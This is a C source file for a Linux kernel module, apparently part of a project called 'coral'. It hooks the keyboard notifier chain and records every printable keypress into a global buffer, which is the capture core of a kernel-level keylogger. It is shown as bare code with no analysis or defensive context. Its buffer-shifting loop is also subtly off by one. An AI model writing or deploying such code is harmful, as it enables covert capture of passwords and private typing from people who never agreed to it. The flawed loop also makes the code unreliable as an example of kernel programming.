#include <linux/keyboard.h>      /* keyboard_notifier_param struct, */
#include <linux/notifier.h>      /* notifier_block struct, KBD_KEYSYM */
#include <linux/string.h>        /* memset() */

#include "coral_notifier.h"      /* BUFFER_LENGTH */

/* buffer to store keys pressed */
char keybuf[BUFFER_LENGTH];

int keybufpos = 0;

static void log_keypress(char keycode)
{
  if(keycode >= 32 && keycode <= 127) {        // is a printable char
    if(keybufpos < BUFFER_LENGTH) {
      keybuf[keybufpos++] = keycode;
    }
    else {
      int i;
      for(i = 0; i < (BUFFER_LENGTH-2); i++) {
	keybuf[i] = keybuf[i+1];
      }

      keybuf[BUFFER_LENGTH-1] = keycode;
      
    }

  }
  
}


/*
 * kbd_notifier_call()
 *
 * This function is given to our notifier_block struct, notif_block, and is the function
 * that is run after a keyboard interrupt.
 *
 * @data: is a keyboard_notifier_param struct
 */

static int kbd_notifier_call(struct notifier_block *nb, unsigned long action, void *data)
{
  
  struct keyboard_notifier_param *knp = data;
    
  if(knp->down && action == KBD_KEYSYM) { // key pressed
    log_keypress(knp->value);
  }

  return NOTIFY_OK;
}


struct notifier_block notif_block = {
  .notifier_call = kbd_notifier_call
};
